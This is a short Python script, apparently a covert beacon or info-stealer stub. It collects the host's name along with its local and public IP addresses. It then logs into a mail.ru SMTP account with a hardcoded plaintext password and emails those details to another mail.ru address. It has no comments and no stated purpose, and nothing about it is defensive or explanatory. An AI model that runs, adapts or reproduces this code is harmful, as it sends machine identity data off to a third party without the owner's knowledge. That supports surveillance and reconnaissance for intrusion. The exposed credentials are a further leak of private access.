import smtplib as smtp
import socket
from getpass import getpass
from requests import get
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text

src_mail = 'pecik_228@mail.ru'
password_SMTP = 'uuQsFq9RiJMxgRmiwLuD'

dest_mail = 'uunluck01@mail.ru'

mail_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(src_mail, dest_mail, 'IP', mail_text)

server = smtp.SMTP_SSL('smtp.mail.ru')

server.login(src_mail, password_SMTP)
server.auth_plain()
server.sendmail(src_mail, dest_mail, message)
server.quit()
